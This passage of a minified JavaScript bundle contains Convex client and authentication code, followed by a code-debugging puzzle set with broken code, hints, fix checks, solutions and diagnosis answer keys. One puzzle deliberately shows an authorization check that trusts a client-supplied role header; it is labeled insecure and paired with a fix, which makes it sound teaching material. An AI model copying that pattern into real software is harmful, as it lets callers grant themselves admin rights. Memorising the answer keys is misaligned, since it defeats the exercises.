F2{constructor(t,n){if(_t(this,"address"),_t(this,"cachedSync"),_t(this,"cachedPaginatedQueryClient"),_t(this,"listeners"),_t(this,"options"),_t(this,"closed",!1),_t(this,"_logger"),_t(this,"adminAuth"),_t(this,"fakeUserIdentity"),t===void 0)throw new Error("No address provided to ConvexReactClient.\nIf trying to deploy to production, make sure to follow all the instructions found at https://docs.convex.dev/production/hosting/\nIf running locally, make sure to run `convex dev` and ensure the .env.local file is populated.");if(typeof t!="string")throw new Error(`ConvexReactClient requires a URL like 'https://happy-otter-123.convex.cloud', received something of type ${typeof t} instead.`);if(!t.includes("://"))throw new Error("Provided address was not an absolute URL.");this.address=t,this.listeners=new Map,this._logger=(n==null?void 0:n.logger)===!1?kh({verbose:(n==null?void 0:n.verbose)??!1}):(n==null?void 0:n.logger)!==!0&&(n!=null&&n.logger)?n.logger:xh({verbose:(n==null?void 0:n.verbose)??!1}),this.options={...n,logger:this._logger}}get url(){return this.address}get sync(){if(this.closed)throw new Error("ConvexReactClient has already been closed.");return this.cachedSync?this.cachedSync:(this.cachedSync=this.options.baseClient??new R2(this.address,()=>{},this.options),this.adminAuth&&this.cachedSync.setAdminAuth(this.adminAuth,this.fakeUserIdentity),this.cachedPaginatedQueryClient=new O2(this.cachedSync,t=>this.handleTransition(t)),this.cachedSync)}get paginatedQueryClient(){if(this.sync,this.cachedPaginatedQueryClient)return this.cachedPaginatedQueryClient;throw new Error("Should already be instantiated")}setAuth(t,n,s){if(typeof t=="string")throw new Error("Passing a string to ConvexReactClient.setAuth is no longer supported, please upgrade to passing in an async function to handle reauthentication.");this.sync.setAuth(t,n??(()=>{}),s)}clearAuth(){this.sync.clearAuth()}setAdminAuth(t,n){if(this.adminAuth=t,this.fakeUserIdentity=n,this.closed)throw new Error("ConvexReactClient has already been closed.");this.cachedSync&&this.sync.setAdminAuth(t,n)}watchQuery(t,...n){const[s,r]=n,i=ye(t);return{onUpdate:o=>{const{queryToken:a,unsubscribe:l}=this.sync.subscribe(i,s,r),c=this.listeners.get(a);return c!==void 0?c.add(o):this.listeners.set(a,new Set([o])),()=>{if(this.closed)return;const u=this.listeners.get(a);u.delete(o),u.size===0&&this.listeners.delete(a),l()}},localQueryResult:()=>{if(this.cachedSync)return this.cachedSync.localQueryResult(i,s)},localQueryLogs:()=>{if(this.cachedSync)return this.cachedSync.localQueryLogs(i,s)},journal:()=>{if(this.cachedSync)return this.cachedSync.queryJournal(i,s)}}}prewarmQuery(t){const n=t.extendSubscriptionFor??_2,r=this.watchQuery(t.query,t.args||{}).onUpdate(()=>{});setTimeout(r,n)}watchPaginatedQuery(t,n,s){const r=ye(t);return{onUpdate:i=>{const{paginatedQueryToken:o,unsubscribe:a}=this.paginatedQueryClient.subscribe(r,n||{},s),l=this.listeners.get(o);return l!==void 0?l.add(i):this.listeners.set(o,new Set([i])),()=>{if(this.closed)return;const c=this.listeners.get(o);c.delete(i),c.size===0&&this.listeners.delete(o),a()}},localQueryResult:()=>this.paginatedQueryClient.localQueryResult(r,n,s)}}mutation(t,...n){const[s,r]=n,i=ye(t);return this.sync.mutation(i,s,r)}action(t,...n){const s=ye(t);return this.sync.action(s,...n)}query(t,...n){const s=this.watchQuery(t,...n),r=s.localQueryResult();return r!==void 0?Promise.resolve(r):new Promise((i,o)=>{const a=s.onUpdate(()=>{a();try{i(s.localQueryResult())}catch(l){o(l)}})})}connectionState(){return this.sync.connectionState()}subscribeToConnectionState(t){return this.sync.subscribeToConnectionState(t)}get logger(){return this._logger}async close(){if(this.closed=!0,this.listeners=new Map,this.cachedPaginatedQueryClient&&(this.cachedPaginatedQueryClient=void 0),this.cachedSync){const t=this.cachedSync;this.cachedSync=void 0,await t.close()}}handleTransition(t){const n=t.queries.map(r=>r.token),s=t.paginatedQueries.map(r=>r.token);this.transition([...n,...s])}transition(t){for(const n of t){const s=this.listeners.get(n);if(s)for(const r of s)r()}}}const Sh=Ut.createContext(void 0);function B2(){return w.useContext(Sh)}const Ib=({client:e,children:t})=>Ut.createElement(Sh.Provider,{value:e},t);function zr(e,...t){const n=t[0]==="skip",s=t[0]==="skip"?{}:Le(t[0]),r=typeof e=="string"?Eb(e):e,i=ye(r),o=w.useMemo(()=>n?{}:{query:{query:r,args:s}},[JSON.stringify(_e(s)),i,n]),l=$2(o).query;if(l instanceof Error)throw l;return l}function Er(e){const t=typeof e=="string"?Eb(e):e,n=w.useContext(Sh);if(n===void 0)throw new Error("Could not find Convex client! `useMutation` must be used in the React component tree under `ConvexProvider`. Did you forget it? See https://docs.convex.dev/quick-start#set-up-convex-in-your-react-app");return w.useMemo(()=>Ob(t,n),[n,ye(t)])}function V2(e){if(typeof e=="object"&&e!==null&&"bubbles"in e&&"persist"in e&&"isDefaultPrevented"in e)throw new Error("Convex function called with SyntheticEvent object. Did you use a Convex function as an event handler directly? Event handlers like onClick receive an event object as their first argument. These SyntheticEvent objects are not valid Convex values. Try wrapping the function like `const handler = () => myMutation();` and using `handler` in the event handler.")}var W2=Object.defineProperty,U2=(e,t,n)=>t in e?W2(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,ec=(e,t,n)=>U2(e,typeof t!="symbol"?t+"":t,n);class z2{constructor(t){ec(this,"createWatch"),ec(this,"queries"),ec(this,"listeners"),this.createWatch=t,this.queries={},this.listeners=new Set}setQueries(t){for(const n of Object.keys(t)){const{query:s,args:r,paginationOptions:i}=t[n];if(ye(s),this.queries[n]===void 0)this.addQuery(n,s,r,i?{paginationOptions:i}:{});else{const o=this.queries[n];(ye(s)!==ye(o.query)||JSON.stringify(_e(r))!==JSON.stringify(_e(o.args))||JSON.stringify(i)!==JSON.stringify(o.paginationOptions))&&(this.removeQuery(n),this.addQuery(n,s,r,i?{paginationOptions:i}:{}))}}for(const n of Object.keys(this.queries))t[n]===void 0&&this.removeQuery(n)}subscribe(t){return this.listeners.add(t),()=>{this.listeners.delete(t)}}getLocalResults(t){const n={};for(const s of Object.keys(t)){const{query:r,args:i}=t[s],o=t[s].paginationOptions;ye(r);const a=this.createWatch(r,i,o?{paginationOptions:o}:{});let l;try{l=a.localQueryResult()}catch(c){if(c instanceof Error)l=c;else throw c}n[s]=l}return n}setCreateWatch(t){this.createWatch=t;for(const n of Object.keys(this.queries)){const{query:s,args:r,watch:i,paginationOptions:o}=this.queries[n],a="journal"in i?i.journal():void 0;this.removeQuery(n),this.addQuery(n,s,r,{...a?{journal:a}:[],...o?{paginationOptions:o}:{}})}}destroy(){for(const t of Object.keys(this.queries))this.removeQuery(t);this.listeners=new Set}addQuery(t,n,s,{paginationOptions:r,journal:i}){if(this.queries[t]!==void 0)throw new Error(`Tried to add a new query with identifier ${t} when it already exists.`);const o=this.createWatch(n,s,{...i?{journal:i}:[],...r?{paginationOptions:r}:{}}),a=o.onUpdate(()=>this.notifyListeners());this.queries[t]={query:n,args:s,watch:o,unsubscribe:a,...r?{paginationOptions:r}:{}}}removeQuery(t){const n=this.queries[t];if(n===void 0)throw new Error(`No query found with identifier ${t}.`);n.unsubscribe(),delete this.queries[t]}notifyListeners(){for(const t of this.listeners)t()}}function $2(e){const t=B2();if(t===void 0)throw new Error("Could not find Convex client! `useQuery` must be used in the React component tree under `ConvexProvider`. Did you forget it? See https://docs.convex.dev/quick-start#set-up-convex-in-your-react-app");const n=w.useMemo(()=>(s,r,{journal:i,paginationOptions:o})=>o?t.watchPaginatedQuery(s,r,o):t.watchQuery(s,r,i?{journal:i}:{}),[t]);return H2(e,n)}function H2(e,t){const[n]=w.useState(()=>new z2(t));n.createWatch!==t&&n.setCreateWatch(t),w.useEffect(()=>()=>n.destroy(),[n]);const s=w.useMemo(()=>({getCurrentValue:()=>n.getLocalResults(e),subscribe:r=>(n.setQueries(e),n.subscribe(r))}),[n,e]);return M2(s)}const Nb=w.createContext(void 0);function Q2(){const e=w.useContext(Nb);if(e===void 0)throw new Error("Could not find `ConvexProviderWithAuth` (or `ConvexProviderWithClerk` or `ConvexProviderWithAuth0`) as an ancestor component. This component may be missing, or you might have two instances of the `convex/react` module loaded in your project.");return e}function G2({children:e,client:t,useAuth:n}){const{isLoading:s,isAuthenticated:r,fetchAccessToken:i}=n(),[o,a]=w.useState(null),[l,c]=w.useState(!1);s&&o!==null&&(a(null),c(!1)),!s&&!r&&o!==!1&&(a(!1),c(!1));const u=r&&(o??!1),d=o===null,h=l&&u,m=w.useMemo(()=>({isLoading:d,isAuthenticated:u,isRefreshing:h}),[d,u,h]);return Ut.createElement(Nb.Provider,{value:m},Ut.createElement(K2,{authProviderAuthenticated:r,fetchAccessToken:i,authProviderLoading:s,client:t,setIsConvexAuthenticated:a,setIsRefreshing:c}),Ut.createElement(Ib,{client:t},e),Ut.createElement(Y2,{authProviderAuthenticated:r,fetchAccessToken:i,authProviderLoading:s,client:t,setIsConvexAuthenticated:a,setIsRefreshing:c}))}function K2({authProviderAuthenticated:e,fetchAccessToken:t,authProviderLoading:n,client:s,setIsConvexAuthenticated:r,setIsRefreshing:i}){return w.useEffect(()=>{let o=!0;if(e)return s.setAuth(t,a=>{o&&r(()=>a)},a=>{o&&i(a)}),()=>{o=!1,r(a=>a?!1:null),i(!1)}},[e,t,n,s,r,i]),null}function Y2({authProviderAuthenticated:e,fetchAccessToken:t,authProviderLoading:n,client:s,setIsConvexAuthenticated:r,setIsRefreshing:i}){return w.useEffect(()=>{if(e)return()=>{s.clearAuth(),r(()=>null),i(!1)}},[e,t,n,s,r,i]),null}const X2=Object.prototype.toString,J2=e=>X2.call(e)==="[object Error]",Z2=new Set(["network error","NetworkError when attempting to fetch resource.","The Internet connection appears to be offline.","Network request failed","fetch failed","terminated"," A network error occurred.","Network connection lost"]);function eP(e){if(!(e&&J2(e)&&e.name==="TypeError"&&typeof e.message=="string"))return!1;const{message:n,stack:s}=e;return n==="Load failed"||n.startsWith("Load failed (")&&n.endsWith(")")?s===void 0||"__sentry_captured__"in e:n.startsWith("error sending request for url")||n==="Failed to fetch"||n.startsWith("Failed to fetch (")&&n.endsWith(")")?!0:Z2.has(n)}const tc=[500,2e3],tP=100,jb=w.createContext(void 0),Mb=w.createContext(void 0);function nP(){return w.useContext(Mb)}const sP=w.createContext(null),nc="__convexAuthOAuthVerifier",po="__convexAuthJWT",fo="__convexAuthRefreshToken",Wm="__convexAuthServerStateFetchTime";function rP({client:e,serverState:t,onChange:n,shouldHandleCode:s,storage:r,storageNamespace:i,replaceURL:o,children:a}){const l=w.useRef((t==null?void 0:t._state.token)??null),[c,u]=w.useState(l.current===null),[d,h]=w.useState(l.current),m=e.verbose??!1,f=w.useCallback(D=>{var _;m&&(console.debug(`${new Date().toISOString()} ${D}`),(_=e.logger)==null||_.logVerbose(D))},[m]),{storageSet:v,storageGet:x,storageRemove:y,storageKey:g}=iP(r,i),[b,k]=w.useState(!1),C=w.useCallback(async D=>{const _=l.current!==null;let U;if(D.tokens===null)l.current=null,D.shouldStore&&(await y(po),await y(fo)),U=null;else{const{token:A}=D.tokens;if(l.current=A,D.shouldStore){const{refreshToken:O}=D.tokens;await v(po,A),await v(fo,O)}U=A}_!==(U!==null)&&await(n==null?void 0:n()),h(U),u(!1)},[v,y]);w.useEffect(()=>{const D=async _=>{if(b){_.preventDefault();const U="Are you sure you want to leave? Your changes may not be saved.";return _.returnValue=!0,U}};return Um("beforeunload",D),()=>{zm("beforeunload",D)}}),w.useEffect(()=>{const D=_=>{(async()=>{if(_.storageArea===r&&_.key===g(po)){const U=_.newValue;f(`synced access token, is null: ${U===null}`),await C({shouldStore:!1,tokens:U===null?null:{token:U}})}})()};return Um("storage",D),()=>zm("storage",D)},[C]);const E=w.useCallback(async D=>{let _,U=0;for(;U<tc.length;)try{return await e.unauthenticatedCall("auth:signIn","code"in D?{params:{code:D.code},verifier:D.verifier}:D)}catch(A){if(_=A,!eP(A))break;const O=tc[U]+tP*Math.random();U++,f(`verifyCode failed with network error, retry ${U} of ${tc.length} in ${O}ms`),await new Promise(j=>setTimeout(j,O))}throw _},[e]),S=w.useCallback(async D=>{const{tokens:_}=await E(D);return f(`retrieved tokens, is null: ${_===null}`),await C({shouldStore:!0,tokens:_??null}),_!==null},[e,C]),T=w.useCallback(async(D,_)=>{const U=_ instanceof FormData?Array.from(_.entries()).reduce((j,[V,Y])=>(j[V]=Y,j),{}):_??{},A=await x(nc)??void 0;await y(nc);const O=await e.authenticatedCall("auth:signIn",{provider:D,params:U,verifier:A});if(O.redirect!==void 0){const j=new URL(O.redirect);return await v(nc,O.verifier),navigator.product!=="ReactNative"&&(window.location.href=j.toString()),{signingIn:!1,redirect:j}}else if(O.tokens!==void 0){const{tokens:j}=O;return f(`signed in and got tokens, is null: ${j===null}`),await C({shouldStore:!0,tokens:j}),{signingIn:O.tokens!==null}}return{signingIn:!1}},[e,C,x]),q=w.useCallback(async()=>{try{await e.authenticatedCall("auth:signOut")}catch{}f("signed out, erasing tokens"),await C({shouldStore:!0,tokens:null})},[C,e]),R=w.useCallback(async({forceRefreshToken:D})=>{if(D){const _=l.current;return await aP(fo,async()=>{const U=l.current;if(U!==_)return f(`returning synced token, is null: ${U===null}`),U;const A=await x(fo)??null;return A!==null?(k(!0),await S({refreshToken:A}).finally(()=>{k(!1)}),f(`returning retrieved token, is null: ${U===null}`),l.current):(k(!1),f("returning null, there is no refresh token"),null)})}return l.current},[S,q,x]),M=w.useRef(!1);w.useEffect(()=>{var U;if(r===void 0)throw new Error("`localStorage` is not available in this environment, set the `storage` prop on `ConvexAuthProvider`!");const D=async()=>{const A=await x(po)??null;f(`retrieved token from storage, is null: ${A===null}`),await C({shouldStore:!1,tokens:A===null?null:{token:A}})};if(t!==void 0){const A=x(Wm),O=j=>{if(!j||t._timeFetched>+j){const{token:V,refreshToken:Y}=t._state,cs=V===null||Y===null?null:{token:V,refreshToken:Y};v(Wm,t._timeFetched.toString()),C({tokens:cs,shouldStore:!0})}else D()};A instanceof Promise?A.then(O):O(A);return}const _=typeof((U=window==null?void 0:window.location)==null?void 0:U.search)<"u"?new URLSearchParams(window.location.search).get("code"):null;if(!M.current)if(_&&(s===void 0||(typeof s=="function"?s():s))){M.current=!0;const A=new URL(window.location.href);A.searchParams.delete("code"),(async()=>(await o(A.pathname+A.search+A.hash),await T(void 0,{code:_}),M.current=!1))()}else D()},[e,x]);const Q=w.useMemo(()=>({signIn:T,signOut:q}),[T,q]),$=d!==null,Ue=w.useMemo(()=>({isLoading:c,isAuthenticated:$,fetchAccessToken:R}),[R,c,$]);return p.jsx(Mb.Provider,{value:Ue,children:p.jsx(jb.Provider,{value:Q,children:p.jsx(sP.Provider,{value:d,children:a})})})}function iP(e,t){const n=oP(),s=w.useMemo(()=>e??n(),[e]),r=t.replace(/[^a-zA-Z0-9]/g,""),i=w.useCallback(c=>`${c}_${r}`,[t]),o=w.useCallback((c,u)=>s.setItem(i(c),u),[s,i]),a=w.useCallback(c=>s.getItem(i(c)),[s,i]),l=w.useCallback(c=>s.removeItem(i(c)),[s,i]);return{storageSet:o,storageGet:a,storageRemove:l,storageKey:i}}function oP(){const[e,t]=w.useState({});return()=>({getItem:n=>e[n],setItem:(n,s)=>{t(r=>({...r,[n]:s}))},removeItem:n=>{t(s=>{const{[n]:r,...i}=s;return i})}})}async function aP(e,t){var s;const n=(s=window==null?void 0:window.navigator)==null?void 0:s.locks;return n!==void 0?await n.request(e,t):await lP(e,t)}function mo(e){globalThis.__convexAuthMutexes===void 0&&(globalThis.__convexAuthMutexes={});let t=globalThis.__convexAuthMutexes[e];return t===void 0&&(globalThis.__convexAuthMutexes[e]={currentlyRunning:null,waiting:[]}),t=globalThis.__convexAuthMutexes[e],t}function sc(e,t){globalThis.__convexAuthMutexes[e]=t}async function Lb(e,t){const n=mo(e);n.currentlyRunning===null?sc(e,{currentlyRunning:t().finally(()=>{const s=mo(e).waiting.shift();mo(e).currentlyRunning=null,sc(e,{...mo(e),currentlyRunning:s===void 0?null:Lb(e,s)})}),waiting:[]}):sc(e,{...n,waiting:[...n.waiting,t]})}async function lP(e,t){return new Promise((s,r)=>{Lb(e,()=>t().then(o=>s(o)).catch(o=>r(o)))})}function Um(e,t,n){var s;typeof window>"u"||(s=window.addEventListener)==null||s.call(window,e,t,n)}function zm(e,t,n){var s;typeof window>"u"||(s=window.removeEventListener)==null||s.call(window,e,t,n)}function cP(){return w.useContext(jb)}function uP(e){const{client:t,storage:n,storageNamespace:s,replaceURL:r,shouldHandleCode:i,children:o}=e,a=w.useMemo(()=>{var l;return{authenticatedCall(c,u){return t.action(c,u)},unauthenticatedCall(c,u){return new j2(t.address,{logger:t.logger}).action(c,u)},verbose:(l=t.options)==null?void 0:l.verbose,logger:t.logger}},[t]);return p.jsx(rP,{client:a,storage:n??(typeof window>"u"||window==null?void 0:window.localStorage),storageNamespace:s??t.address,replaceURL:r??(l=>{window.history.replaceState({},"",l)}),shouldHandleCode:i,children:p.jsx(G2,{client:t,useAuth:nP,children:o})})}function Db(e,t){const n={get(s,r){if(typeof r=="string"){const i=[...t,r];return Db(e,i)}else if(r===Ab){if(t.length<1){const i=[e,...t].join(".");throw new Error(`API path is expected to be of the form \`${e}.childComponent.functionName\`. Found: \`${i}\``)}return"_reference/childComponent/"+t.join("/")}else return}};return new Proxy({},n)}const dP=()=>Db("components",[]),Rt=GR;dP();function qi(e,t,n=JSON.stringify){const s=new Set,r=()=>{for(const o of s)o()};return{key:e,get:()=>{try{return t(localStorage.getItem(e))}catch{return t(null)}},set(o){try{localStorage.setItem(e,n(o))}catch{}r()},reset(){try{localStorage.removeItem(e)}catch{}r()},subscribe(o){return s.add(o),()=>{s.delete(o)}}}}function Th(e){const[t,n]=w.useState(e.get);return w.useEffect(()=>e.subscribe(()=>n(e.get())),[e]),t}function wi(e){if(e===null||e==="")return{};const t=JSON.parse(e);return!t||typeof t!="object"||Array.isArray(t)?{}:t}function uI(e,t){try{if(localStorage.getItem(t)!==null)return;const n=localStorage.getItem(e);if(n===null)return;localStorage.setItem(t,n),localStorage.removeItem(e)}catch{}}const hP="clr-progress-v2",_b=["clr-progress-v1","clr-progress"];function Oi(e){return e.split("!")[0]}function $m(e){const t={};if(!e||typeof e!="object")return t;for(const[n,s]of Object.entries(e)){const r=typeof s=="number"?s:Number(s);Number.isFinite(r)&&(t[n]=Math.min(1,Math.max(0,r)))}return t}function pP(e){const t={};for(const[n,s]of Object.entries(e))t[n.includes("!")?n:n+"!"]=s;return t}function fP(e){try{return localStorage.getItem(e)}catch{return null}}function mP(e){try{if(e!==null){const t=wi(e);if(t.completed!==void 0)return{completed:$m(t.completed)}}for(const t of _b){const n=fP(t);if(n===null)continue;const s=wi(n);if(s.completed!==void 0)return{completed:pP($m(s.completed))}}}catch{}return{completed:{}}}const Ii=qi(hP,mP);function Hm(e){return Ii.subscribe(e)}function Is(){return Ii.get()}function Fb(e){Ii.set(e)}function gP(e,t,n){const s=Is(),r=Ni(s,e);return t<=r||(s.completed[e+"!"+n]=t,Fb(s)),s}function Ni(e,t){let n=0;for(const[s,r]of Object.entries(e.completed))Oi(s)===t&&(n=Math.max(n,r));return n}function Lu(){Ii.reset();for(const e of _b)try{localStorage.removeItem(e)}catch{}}function yP(e,t){const n={completed:{...e.completed}};for(const[s,r]of Object.entries(t.completed))n.completed[s]=Math.max(n.completed[s]??0,r);return n}function Za(){return Th(Ii)}function dI(){return{get:Is,record:gP,reset:Lu}}const wP="clr-clan-rewards-v1",Ca=qi(wP,e=>{const t={};for(const[n,s]of Object.entries(wi(e))){const r=typeof s=="number"?s:Number(s);Number.isFinite(r)&&r>0&&(t[n]=r)}return t});function hI(e,t){const n=Ca.get();n[e]===void 0&&Ca.set({...n,[e]:t})}function vP(){return Object.values(Ca.get()).reduce((e,t)=>e+t,0)}function Qm(){Ca.reset()}const Ft=(e,t)=>({tier:e,text:t}),bP={"off-by-one":{prompt:"What kind of defect is this?",codes:["EC","SL","RC","CX"],answer:"EC"},"silent-mutator":{prompt:"What kind of defect is this?",codes:["SL","EC","RC","CX"],answer:"SL"},"closure-trap":{prompt:"What kind of defect is this?",codes:["SL","EC","RC","CX"],answer:"SL"},"lost-this":{prompt:"What kind of defect is this?",codes:["SL","EC","HA","CX"],answer:"SL"},"missing-await":{prompt:"What kind of defect is this?",codes:["RC","SL","EC","CX"],answer:"RC"},"shallow-copy":{prompt:"What kind of defect is this?",codes:["SL","EC","RC","CX"],answer:"SL"},"sort-and-mutate":{prompt:"What kind of defect is this?",codes:["SL","EC","CX","HA"],answer:"SL"}},xP=[{id:"quadratic-dedupe",title:"The Duplicate Check That Cost a Quarter Million Comparisons",brief:"The comment says this was 'verified against production data'. On a 600-item batch the budget counter trips before the answer arrives — while the same answer is one Set away.",broken:`const items = Array.from({ length: 600 }, (_, i) => i * 2);
const ops = { n: 0 };
const BUDGET = 20000;

function containsDuplicate(nums) {
  // verified against production data at scale
  for (let i = 0; i < nums.length; i++) {
    for (let j = i + 1; j < nums.length; j++) {
      ops.n++;
      if (ops.n > BUDGET) throw new Error("operation budget exceeded");
      if (nums[i] === nums[j]) return true;
    }
  }
  return false;
}

console.log("first pass:", containsDuplicate(items));
const afterFirst = ops.n;
console.log("operations:", afterFirst);
console.log("duplicate case:", containsDuplicate([1, 2, 2]));`,fixCheck:'output.includes("first pass: false") && output.includes("operations: 600") && output.includes("duplicate case: true")',win:"One pass, one payment: the Set answers 'seen before?' in constant time, so 600 items cost 600 operations instead of a quarter of a million.",hints:[Ft(1,"Run it and read the error: the budget is a stand-in for real time. Where does the work grow fastest — with the number of items, or with the number of *pairs*?"),Ft(2,"The inner loop exists only to compare each item against every item after it. A structure that can answer 'have I seen this value already?' removes the inner loop entirely."),Ft(3,"Use a Set: one loop over nums, `ops.n++` once per item, `if (seen.has(x)) return true` else `seen.add(x)`. The reference fix prints `operations: 600` because it touches each item exactly once.")],solution:"A nested loop over all pairs is O(n²): 600 items means ~179,700 comparisons before it can conclude there is no duplicate, which the budget turns into a hard, deterministic failure (never wall-clock timing). The fix is the canonical dedupe: a Set answers membership in O(1), so one pass answers the same question — and the printed operation count is the proof the complexity actually changed, not just that the tests went green.",fix:`const items = Array.from({ length: 600 }, (_, i) => i * 2);
const ops = { n: 0 };

function containsDuplicate(nums) {
  const seen = new Set();
  for (const n of nums) {
    ops.n++;
    if (seen.has(n)) return true;
    seen.add(n);
  }
  return false;
}

console.log("first pass:", containsDuplicate(items));
const afterFirst = ops.n;
console.log("operations:", afterFirst);
console.log("duplicate case:", containsDuplicate([1, 2, 2]));`,diagnosis:{prompt:"What kind of defect is this?",codes:["CX","SL","EC","RC"],answer:"CX"}},{id:"invented-helpers",title:"The Helpers That Were Never Invented",brief:"The comments name two platform helpers. Neither exists, and the program dies on its first call — the model wrote plausible-looking API surface instead of code that runs.",broken:`function clampScore(n) {
  // the platform's built-in clamp
  return Math.clamp(n, 0, 100);
}

function ranked(scores) {
  // .sorted() returns a sorted copy
  return [...new Set(scores)].sorted((a, b) => a - b);
}

console.log("clamped:", clampScore(137), clampScore(-4));
console.log("ranked:", ranked([42, 7, 42, 19]).join(","));`,fixCheck:'output.includes("clamped: 100 0") && output.includes("ranked: 7,19,42")',win:"The real APIs do the same job: Math.min/Math.max for the clamp, and a copied .sort() — which also keeps the original array untouched.",hints:[Ft(1,"Run it. The error names the exact expression that does not exist — that is the hallucination, and it is only the first one."),Ft(2,"There is no Array.prototype.sorted and no Math.clamp. Ask what each line is for: clamping a number into a range, and a sorted copy without mutating the input."),Ft(3,"Use Math.min(100, Math.max(0, n)) for the clamp, and `[...new Set(scores)].sort((a, b) => a - b)` — the spread already gives you the copy that `.sorted()` was pretending to.")],solution:"Two invented APIs (HA). Math.clamp and Array.prototype.sorted are neither in the language nor in any of the bounded environments this app runs (the sandbox's ambient declarations are the same surface the TypeScript track compiles against). The honest fix uses the real methods: Math.min/Math.max for the range, and a copied .sort for ordering. Note the copy — sort() mutates in place, which is why the naive `.sort()` on the Set spread is correct here but on a caller's array would not be.",fix:`function clampScore(n) {
  return Math.min(100, Math.max(0, n));
}

function ranked(scores) {
  return [...new Set(scores)].sort((a, b) => a - b);
}

console.log("clamped:", clampScore(137), clampScore(-4));
console.log("ranked:", ranked([42, 7, 42, 19]).join(","));`,diagnosis:{prompt:"What kind of defect is this?",codes:["HA","SL","EC","CX"],answer:"HA"}},{id:"trusted-role-header",title:"The Role That Came From the Caller",brief:"The middleware reads the role out of a header the client controls. The audit lines show which branch ran — and the spoofed request is accepted as an admin.",broken:`const USERS = { u1: { id: "u1", role: "viewer" }, u2: { id: "u2", role: "admin" } };

function authorize(session) {
  // the gateway sets x-user-role before we ever see the request
  const role = session.headers["x-user-role"] ?? "viewer";
  if (role === "admin") {
    console.log("insecure: admin granted from a client-supplied header");
    return true;
  }
  console.log("secure: viewer denied");
  return false;
}

const spoofed = { userId: "u1", headers: { "x-user-role": "admin" } };
const realAdmin = { userId: "u2", headers: { "x-user-role": "admin" } };
console.log("spoofed admin accepted:", authorize(spoofed));
console.log("real admin accepted:", authorize(realAdmin));
console.log("unsigned request accepted:", authorize({ userId: "u1", headers: {} }));`,fixCheck:'!output.includes("insecure: admin granted") && output.includes("spoofed admin accepted: false") && output.includes("real admin accepted: true") && output.includes("ignored client-supplied role claim")',win:"The role now comes from the server-side store. The header is still noticed — and explicitly ignored, on the record — while the real admin still gets in.",hints:[Ft(1,"Read the three outcomes in order. One of them should never be possible: which request is claiming something about itself?"),Ft(2,"A header is input, not identity. The role has to come from a source the caller cannot write — here, the USERS record keyed by the authenticated userId."),Ft(3,"Look up the user by `session.userId`, read `user.role`, and ignore `x-user-role` entirely (log that you ignored it). Derive, never trust.")],solution:"An insecure default (ID): authorization derived from a client-supplied header. Any caller can set `x-user-role: admin`, and the instrumented fixture makes the decision observable — the `insecure:` line proves the unsafe branch ran, and the check fails while it does. The repair treats the header as untrusted input: the role is read from the server-side store, unknown users are denied, and the ignored claim is logged so the decision is auditable. The same discipline covers the other ID shapes — permissive CORS, string-concatenated SQL, disabled certificate checks — the fix is never 'hide it better', it is 'stop deriving authority from input'.",fix:`const USERS = { u1: { id: "u1", role: "viewer" }, u2: { id: "u2", role: "admin" } };

function authorize(session) {
  const user = USERS[session.userId];
  if (!user) {
    console.log("secure: unknown user denied");
    return false;
  }
  if (session.headers["x-user-role"] !== undefined) {
    console.log("secure: ignored client-supplied role claim");
  }
  if (user.role === "admin") {
    console.log("secure: admin via the server-side role");
    return true;
  }
  console.log("secure: viewer denied");
  return false;
}

const spoofed = { userId: "u1", headers: { "x-user-role": "admin" } };
const realAdmin = { userId: "u2", headers: { "x-user-role": "admin" } };
console.log("spoofed admin accepted:", authorize(spoofed));
console.log("real admin accepted:", authorize(realAdmin));
console.log("unsigned request accepted:", authorize({ userId: "u1", headers: {} }));`,diagnosis:{prompt:"What kind of defect is this?",codes:["ID","SL","EC","HA"],answer:"ID"}}],G=(e,t)=>({tier:e,text:t}),Gm=e=>`output.split("\\n")[${e}].trim()`,kP=[{id:"off-by-one",title:"The Off-By-One",brief:"This should sum every number from 1 to n inclusive. It prints two numbers that are both short by exactly n. Find why.",broken:`function sumToN(n) {
  let total = 0;
  for (let i = 1; i < n; i++) {
    total += i;
  }
  return total;
}

console.log("sum(5) =", sumToN(5));
console.log("sum(10) =", sumToN(10));`,fixCheck:'output.includes("sum(5) = 15") && output.includes("sum(10) = 55")',win:"The loop stopped one short. `i < n` skips n itself — an inclusive range needs `i <= n`.",hints:[G(1,"Compare what the loop adds to what the brief asks for. Which number never gets added?"),G(2,"Walk the loop by hand for n = 5: which values does `i` take, and which one is missing?"),G(3,"The condition `i < n` stops before n. Use `i <= n` and re-run.")],solution:"`i < n` runs while i is strictly less than n, so n is never added: sum(5) returns 1+2+3+4 = 10 instead of 15. Change the condition to `i <= n`. Off-by-one errors are the single most common loop bug — when a result is off by exactly one term, check the loop bounds first.",fix:`function sumToN(n) {
  let total = 0;
  for (let i = 1; i <= n; i++) {
    total += i;
  }
  return total;
}

console.log("sum(5) =", sumToN(5));
console.log("sum(10) =", sumToN(10));`},{id:"silent-mutator",title:"The Silent Mutator",brief:`"original" and "returned" should not be the same array. The function is supposed to return a new array while leaving the caller's data untouched.`,broken:`function addItem(arr, item) {
  arr.push(item);
  return arr;
}

const fruits = ["apple", "banana"];
const more = addItem(fruits, "cherry");

console.log("original:", fruits.join(","));
console.log("returned:", more.join(","));`,fixCheck:`${Gm(0)} === "original: apple,banana" && output.includes("returned: apple,banana,cherry")`,win:"You returned a new array instead of mutating the caller's. That's the difference between a function and a side effect.",hints:[G(1,"Both lines print the same thing. Is `arr` inside the function a copy of `fruits`, or the very same array?"),G(2,"`push` changes the array you call it on. Which array is that here — the parameter or a copy of it?"),G(3,"Build the result without touching the parameter: `return [...arr, item];`")],solution:"`arr` and `fruits` reference the same object in memory, so `arr.push(item)` mutates the caller's array. Return a copy instead: `return [...arr, item]` (or `arr.concat(item)`). Mutating arguments is how functions leak surprises into unrelated parts of a program — prefer returning new values.",fix:`function addItem(arr, item) {
  return [...arr, item];
}

const fruits = ["apple", "banana"];
const more = addItem(fruits, "cherry");

console.log("original:", fruits.join(","));
console.log("returned:", more.join(","));`},{id:"closure-trap",title:"The Closure Trap",brief:"Three timers are scheduled with delays of 0, 1 and 2 ticks. They should capture 0, 1 and 2 — but they all capture the same number.",broken:`const captured = [];

for (var i = 0; i < 3; i++) {
  setTimeout(() => {
    captured.push(i);
  }, i * 40);
}

setTimeout(() => {
  console.log("captured:", captured.join(","));
